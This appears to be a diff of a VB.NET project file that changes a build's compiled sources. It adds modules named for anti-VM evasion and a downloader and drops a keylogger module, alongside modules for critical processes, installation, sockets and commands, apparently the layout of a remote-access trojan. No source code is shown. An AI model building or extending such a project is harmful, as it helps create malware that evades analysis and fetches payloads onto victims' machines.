@@ -58,13 +58,14 @@
     <Import Include="System" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="C_AntiVM.vb" />
     <Compile Include="C_CriticalProcesses.vb" />
     <Compile Include="C_Commands.vb" />
+    <Compile Include="C_Downloader.vb" />
     <Compile Include="C_Encryption.vb" />
     <Compile Include="C_Functions.vb" />
     <Compile Include="C_ID.vb" />
     <Compile Include="C_Installation.vb" />
-    <Compile Include="C_Keylog.vb" />
     <Compile Include="C_Main.vb" />
     <Compile Include="C_Settings.vb" />
     <Compile Include="C_Socket.vb" />
